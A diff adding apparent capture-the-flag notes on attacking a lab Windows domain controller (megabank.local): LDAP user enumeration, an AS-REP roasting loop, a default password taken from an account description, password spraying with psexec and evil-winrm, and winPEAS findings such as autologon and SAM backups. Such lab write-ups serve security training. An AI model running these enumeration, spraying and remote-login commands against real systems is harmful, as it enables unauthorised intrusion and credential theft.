@@ -1,0 +1,98 @@
+ldapsearch 
+- Using ldapsearch -h 10.10.10.169 -x -s base namingcontexts
+=> 
+namingContexts: DC=megabank,DC=local
+namingContexts: CN=Configuration,DC=megabank,DC=local
+namingContexts: CN=Schema,CN=Configuration,DC=megabank,DC=local
+namingContexts: DC=DomainDnsZones,DC=megabank,DC=local
+namingContexts: DC=ForestDnsZones,DC=megabank,DC=local
+
+- Using ldapsearch -h 10.10.10.169 -x -b 'DC=megabank,DC=local' '(objectClass=Person)' sAMAccountName
+=> We get the systems user, saved in users file
+
+
+- for user in $(cat users); do GetNPUsers.py -no-pass -dc-ip 10.10.10.161 megabank/${user} | grep -v Impacket; done
+=> Failed attempt, we did not get usable information
+
+
+=> Upon closer inspection of ldap-search-Person
+- # Marko Novak, Employees, MegaBank Users, megabank.local
+dn: CN=Marko Novak,OU=Employees,OU=MegaBank Users,DC=megabank,DC=local
+objectClass: top
+objectClass: person
+objectClass: organizationalPerson
+objectClass: user
+cn: Marko Novak
+sn: Novak
+{==== description: Account created. Password set to Welcome123! ====}
+givenName: Marko
+...
+{==== sAMAccountName: marko ====}
+sAMAccountType: 805306368
+{==== userPrincipalName: marko@megabank.local ====}
+...
+
+
+Evil-Winrm
+- ruby /opt/evil-winrm/evil-winrm.rb -i 10.10.10.169 -u [marko|marko@megabank.local] -p Welcome123!
+=> Using evil-winrm with both marko and marko@megabank.local with the password we found we get:
+    Error: An error of type WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError
+
+
+psexec
+- for user in $(cat users); do psexec.py ${user}@10.10.10.169 | grep -v Impacket; done
+=> Using all users we found with the password none can login BUT user "melanie" gives a different result:
+[*] Requesting shares on 10.10.10.169.....
+[-] share 'ADMIN$' is not writable.
+[-] share 'C$' is not writable.
+[-] share 'NETLOGON' is not writable.
+[-] share 'SYSVOL' is not writable.
+
+
+Evil-Winrm
+- ruby /opt/evil-winrm/evil-winrm.rb -i 10.10.10.169 -u melanie -p 'Welcome123!'
+=> Success login as melanie, low priv shell
+
+
+Uploaded winPEAS.exe 
+intresting findings:
+
+- cachedlogonscount is 10 https://book.hacktricks.xyz/windows/stealing-credentials/credentials-protections#cached-credentials
+
+-Users:
+C:\Users\Administrator
+C:\Users\All Users
+C:\Users\Default
+C:\Users\Default User
+C:\Users\melanie
+C:\Users\Public
+C:\Users\ryan
+
+- C:\ (Type: Fixed)(Filesystem: NTFS)(Available space: 28 GB)(Permissions: Users [AppendData/CreateDirectories])
+
+-Some AutoLogon credentials were found!!
+    DefaultDomainName             :  MEGABANK
+    DefaultUserName               :  Administrator
+
+
+- Local network
+UDP       127.0.0.1:53                                  Listening
+UDP       127.0.0.1:49383                               Listening
+UDP       127.0.0.1:50468                               Listening
+UDP       127.0.0.1:56060                               Listening
+UDP       127.0.0.1:58260                               Listening
+UDP       127.0.0.1:59088                               Listening
+UDP       127.0.0.1:64827                               Listening
+
+
+[?] Showing only DENY rules (too many ALLOW rules always) 
+Current Profiles: PUBLIC
+FirewallEnabled (Domain):    False
+FirewallEnabled (Private):    False
+FirewallEnabled (Public):    False
+
+
+
+[+] Looking for common SAM & SYSTEM backups()
+    C:\Windows\System32\config\RegBack\SAM
+    C:\Windows\System32\config\RegBack\SYSTEM
